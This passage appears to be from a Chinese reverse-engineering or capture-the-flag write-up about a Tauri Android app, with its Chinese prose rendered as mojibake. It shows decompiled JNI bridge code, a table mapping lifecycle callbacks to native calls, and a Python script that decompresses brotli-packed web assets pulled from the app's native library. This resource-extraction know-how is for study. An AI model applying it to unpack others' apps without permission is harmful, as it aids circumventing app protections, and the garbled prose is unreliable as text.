src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507240958199.png"></p><p>WryActivity æœ¬èº«å‡ ä¹ä¸å«ä¸šåŠ¡é€»è¾‘ï¼›å®ƒçš„ä½œä¸º<strong>â€œæ¡¥â€</strong>ï¼ŒåŠ è½½äº†nativeç±»ï¼Œåè°ƒåœ¨Tauriæ¡†æ¶ä¸‹javaå±‚â€¯å’Œnativeå±‚ä¹‹é—´çš„è¿è¡Œä¼ è¾“ï¼Œæˆ‘ä»¬éœ€è¦å»è·Ÿè¿›æŸ¥çœ‹ez_android_lib</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageInfo;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.KeyEvent;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> p058e.AbstractActivityC0854g;</span><br><span class="line"><span class="keyword">import</span> p087o1.AbstractC1272d;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span><span class="comment">//AbstractActivityC0854gæ˜¯å®‰å“è¿è¡Œçš„ä¸€äº›é€»è¾‘å’ŒåŠ å¯†æ— å…³</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">WryActivity</span> <span class="keyword">extends</span> <span class="title class_">AbstractActivityC0854g</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: y */</span></span><br><span class="line">    <span class="keyword">public</span> RustWebView f3224y;<span class="comment">//yâ€ƒâ€”â€” è¿è¡ŒæœŸçœŸæ­£æ‰¿è½½å‰ç«¯é¡µé¢çš„ RustWebViewï¼ˆTauri ç”¨ Rust-wry å°è£…çš„ WebViewï¼‰ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Companion</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;ez_android_lib&quot;</span>);<span class="comment">//åŠ è½½nativeå±‚</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è¿™äº› native æ¥å£å‡ ä¹ä¸€ä¸€å¯¹åº” Android ç”Ÿå‘½å‘¨æœŸï¼Œä½œç”¨æ˜¯æŠŠ Java ä¾§çš„äº‹ä»¶è½¬å‘åˆ°Rustä¾§ï¼Œè®© Rust è´Ÿè´£çœŸæ­£çš„ä¸šåŠ¡é€»è¾‘ã€çŠ¶æ€ç®¡ç†ã€èµ„æºæ¸…ç†ç­‰ã€‚</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">(WryActivity wryActivity)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">focus</span><span class="params">(<span class="type">boolean</span> z2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">memory</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">onActivityDestroy</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">pause</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">resume</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//getAppClass(name)ç»™ Rust/JS ä¾§æä¾›ä¸€ä¸ªåå°„è¾…åŠ©ï¼Œè®© Java ä¾§åå°„æ‰¾ç±»</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Class&lt;?&gt; getAppClass(String str) &#123;</span><br><span class="line">        AbstractC1272d.m3042d(<span class="string">&quot;name&quot;</span>, str);</span><br><span class="line">        <span class="keyword">return</span> Class.forName(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getVersion() â€”â€” è·å–ç³»ç»Ÿ WebView/Chrome ç‰ˆæœ¬</span></span><br><span class="line">    <span class="meta">@SuppressLint(&#123;&quot;WebViewApiAvailability&quot;, &quot;ObsoleteSdkInt&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        PackageInfo currentWebViewPackage;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            currentWebViewPackage = WebView.getCurrentWebViewPackage();</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> currentWebViewPackage != <span class="literal">null</span> ? currentWebViewPackage.versionName : <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> str == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getPackageManager().getPackageInfo(<span class="string">&quot;com.android.chrome&quot;</span>, <span class="number">0</span>).versionName.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            AbstractC1272d.m3042d(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Unable to get package info for &#x27;com.android.chrome&#x27;&quot;</span> + e2);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> getPackageManager().getPackageInfo(<span class="string">&quot;com.android.webview&quot;</span>, <span class="number">0</span>).versionName.toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e3) &#123;</span><br><span class="line">                AbstractC1272d.m3042d(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Unable to get package info for &#x27;com.android.webview&#x27;&quot;</span> + e3);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, androidx.activity.AbstractActivityC0519g, p106v.AbstractActivityC1485h, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        create(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        destroy();</span><br><span class="line">        onActivityDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, android.app.Activity, android.view.KeyEvent.Callback</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> i2, KeyEvent keyEvent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i2 == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">RustWebView</span> <span class="variable">rustWebView</span> <span class="operator">=</span> <span class="built_in">this</span>.f3224y;</span><br><span class="line">            <span class="keyword">if</span> (rustWebView == <span class="literal">null</span>) &#123;</span><br><span class="line">                AbstractC1272d.m3045g(<span class="string">&quot;mWebView&quot;</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (rustWebView.canGoBack()) &#123;</span><br><span class="line">                <span class="type">RustWebView</span> <span class="variable">rustWebView2</span> <span class="operator">=</span> <span class="built_in">this</span>.f3224y;</span><br><span class="line">                <span class="keyword">if</span> (rustWebView2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    rustWebView2.goBack();</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                AbstractC1272d.m3045g(<span class="string">&quot;mWebView&quot;</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(i2, keyEvent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, android.app.Activity, android.content.ComponentCallbacks</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onLowMemory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onLowMemory();</span><br><span class="line">        memory();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onPause();</span><br><span class="line">        pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onResume();</span><br><span class="line">        resume();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.activity.AbstractActivityC0519g, p106v.AbstractActivityC1485h, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onSaveInstanceState</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        AbstractC1272d.m3042d(<span class="string">&quot;outState&quot;</span>, bundle);</span><br><span class="line">        <span class="built_in">super</span>.onSaveInstanceState(bundle);</span><br><span class="line">        save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onStart();</span><br><span class="line">        start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// p058e.AbstractActivityC0854g, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onStop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onStop();</span><br><span class="line">        stop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity, android.view.Window.Callback</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onWindowFocusChanged</span><span class="params">(<span class="type">boolean</span> z2)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onWindowFocusChanged(z2);</span><br><span class="line">        focus(z2);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//ä¾› Rust ä¾§/æ’ä»¶ åœ¨åˆ›å»ºå®Œ WebView åï¼Œå›ä¼ åˆ° Java æ´»åŠ¨é‡Œä¿å­˜å¼•ç”¨ï¼Œä»¥ä¾¿åç»­æ‹¦æˆªé”®ã€é”€æ¯ç­‰ã€‚</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setWebView</span><span class="params">(RustWebView rustWebView)</span> &#123;</span><br><span class="line">        AbstractC1272d.m3042d(<span class="string">&quot;webView&quot;</span>, rustWebView);</span><br><span class="line">        <span class="built_in">this</span>.f3224y = rustWebView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Android å›è°ƒ</th><th>Java ä¾§åŠ¨ä½œ</th><th>JNI è°ƒç”¨</th></tr></thead><tbody><tr><td><code>onCreate</code></td><td><code>create(this)</code></td><td>åˆå§‹åŒ– Rust ä¾§ runtimeï¼Œä¼ é€’ Activity æŒ‡é’ˆ</td></tr><tr><td><code>onStart</code></td><td><code>start()</code></td><td>é¡µé¢çœŸæ­£ visibleï¼ŒRust å¯æ‹‰èµ·å‰ç«¯é€»è¾‘</td></tr><tr><td><code>onResume</code></td><td><code>resume()</code></td><td>æ¢å¤æ¸²æŸ“&#x2F;JS é€šé“ï¼Œå¯èƒ½é‡å¯ WebSocketã€è®¡æ—¶å™¨</td></tr><tr><td><code>onWindowFocusChanged</code></td><td><code>focus(hasFocus)</code></td><td>é€šçŸ¥ç„¦ç‚¹å˜åŒ–ï¼Œå†³å®šæ˜¯å¦æ‹¦æˆªé”®ç›˜ã€é¼ æ ‡</td></tr><tr><td><code>onPause</code></td><td><code>pause()</code></td><td>æš‚åœ JS å®šæ—¶å™¨ã€åª’ä½“ã€Sensor</td></tr><tr><td><code>onStop</code></td><td><code>stop()</code></td><td>è¿›å…¥åå°ï¼Œå…³é—­é•¿è¿æ¥ã€MediaSession</td></tr><tr><td><code>onDestroy</code></td><td><code>destroy()</code> â†’ <code>onActivityDestroy()</code></td><td>å…ˆé‡Šæ”¾ Rust ä¾§èµ„æºï¼Œå†åšé¢å¤–æ”¶å°¾</td></tr><tr><td><code>onLowMemory</code></td><td><code>memory()</code></td><td>å†…å­˜åƒç´§ï¼Œè®© Rust æ¸… cache</td></tr><tr><td><code>onSaveInstanceState</code></td><td><code>save()</code></td><td>å¤‡ä»½å½“å‰é¡µé¢çŠ¶æ€ï¼ˆhistoryã€localStorage ç­‰ï¼‰</td></tr></tbody></table><h2 id="nativeå±‚"><a href="#nativeå±‚" class="headerlink" title="nativeå±‚"></a>nativeå±‚</h2><p>å°±åƒæ˜¯ä¸Šé¢è¯´çš„ï¼Œè¿™é‡Œä½¿ç”¨äº†rustæ„å»º.soæ–‡ä»¶</p><p>ä½†æ˜¯æŸ¥çœ‹ç›¸åº”çš„nativeæ–¹æ³•å¹¶æ²¡æœ‰å’ŒåŠ å¯†é€»è¾‘æœ‰å…³çš„ä¸œè¥¿ï¼Œ</p><p>æ ¹æ®è¿™ä¸ªæ–‡æ¡£ï¼š<a href="https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</a></p><p>æˆ‘ä»¬çŸ¥é“çœŸæ­£çš„èµ„æºæ–‡ä»¶å·²ç»è¢«brotli ç®—æ³•è¿›è¡Œå‹ç¼©åå†æ‰“åŒ…ã€‚æ ¹æ®åšå®¢ä¸Šçš„å†…å®¹æ‰¾å­—ç¬¦ä¸²&#x2F;index.html</p><p>è¿™é‡Œæœ‰å¾ˆå¤šçš„&#x2F;index.htmlï¼Œè€Œæˆ‘ä»¬è¦æ‰¾çš„&#x2F;index.htmlæ˜¯ä¸‹é¢æœ‰æ–‡ä»¶å†…å®¹åœ°å€çš„é‚£ä¸ªå­—ç¬¦ä¸²</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507241120732.png"></p><p>è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œéƒ½æ˜¯ä»¥qwordå½¢å¼å­˜åœ¨ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªæ˜¯æ–‡ä»¶åé•¿åº¦ï¼Œç¬¬ä¸‰ä¸ªå·²ç»è¢«å‹ç¼©æ‰“åŒ…çš„æ–‡ä»¶å†…å®¹åœ°å€ï¼Œï¼Œç¬¬å››ä¸ªæ˜¯æ–‡ä»¶å†…å®¹é•¿åº¦</p><p>æŠŠå†…å®¹dumpä¸‹æ¥å†™ä¸ªpythonè„šæœ¬è¿›è¡Œè§£åŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dump.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    hex_content = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åå…­è¿›åˆ¶å†…å®¹é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(hex_content)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚</span></span><br><span class="line">    binary_content = binascii.unhexlify(hex_content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;äºŒè¿›åˆ¶å†…å®¹é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(binary_content)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°è¯• Brotli è§£å‹ç¼©</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decompressed = brotli.decompress(binary_content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è§£å‹ç¼©æˆåŠŸï¼å¤§å°: <span class="subst">&#123;<span class="built_in">len</span>(decompressed)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†è§£å‹ç¼©çš„æ•°æ®å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dumpâ€”_unpack&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decompressed)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è§£å‹ç¼©æ•°æ®å·²å†™å…¥ &#x27;dump&#x27; æ–‡ä»¶&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯æ–‡æœ¬ï¼Œå°è¯•æ˜¾ç¤ºå‰é¢çš„éƒ¨åˆ†</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            preview = decompressed[:<span class="number">200</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nè§£å‹ç¼©å†…å®¹é¢„è§ˆ:\n<span class="subst">&#123;preview&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nè§£å‹ç¼©çš„å†…å®¹ä¼¼ä¹æ˜¯äºŒè¿›åˆ¶æ•°æ®&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> brotli.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Brotli è§£å‹ç¼©å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;åå…­è¿›åˆ¶è§£ç å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å†…å®¹å¯èƒ½ä¸æ˜¯åå…­è¿›åˆ¶æ ¼å¼&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°è¯•ç›´æ¥æŒ‰äºŒè¿›åˆ¶è¯»å–</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å°è¯•ç›´æ¥æŒ‰äºŒè¿›åˆ¶è¯»å–æ–‡ä»¶...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;export_results.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            binary_content = f.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;äºŒè¿›åˆ¶è¯»å–æˆåŠŸï¼å¤§å°: <span class="subst">&#123;<span class="built_in">len</span>(binary_content)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decompressed = brotli.decompress(binary_content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ç›´æ¥äºŒè¿›åˆ¶ Brotli è§£å‹ç¼©æˆåŠŸï¼å¤§å°: <span class="subst">&#123;<span class="built_in">len</span>(decompressed)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dump_direct&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(decompressed)</span><br><span class="line">        <span class="keyword">except</span> brotli.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ç›´æ¥äºŒè¿›åˆ¶ Brotli è§£å‹ç¼©å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;äºŒè¿›åˆ¶è¯»å–å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nåˆ†æå®Œæˆã€‚è¯·æ£€æŸ¥ç”Ÿæˆçš„ dump æ–‡ä»¶è·å–ç»“æœã€‚&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><p>åˆ†ædumpä¸‹æ¥çš„htmlæ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°è¿˜è¦è§£åŒ…ä¸€ä¸ªindex-BsFf5qny.jsçš„æ–‡ä»¶ï¼Œç»§ç»­dump+è§£åŒ…+æ ¼å¼åŒ–</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 